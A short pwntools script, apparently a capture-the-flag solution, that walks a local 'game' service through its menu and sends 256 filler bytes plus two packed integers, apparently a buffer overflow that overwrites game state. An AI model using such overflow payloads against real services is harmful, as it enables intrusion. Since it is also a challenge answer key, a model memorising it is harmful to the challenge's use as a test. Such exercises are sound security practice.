#!/usr/bin/env python
from pwn import *

p = remote("localhost", 19201)#process("./game")
p.sendline('y')
p.sendline('1')
p.sendline('A')
p.sendline('1')
p.sendline('B'*256 + p32(0x02) + p32(0x01))
p.sendline('3')
p.interactive()
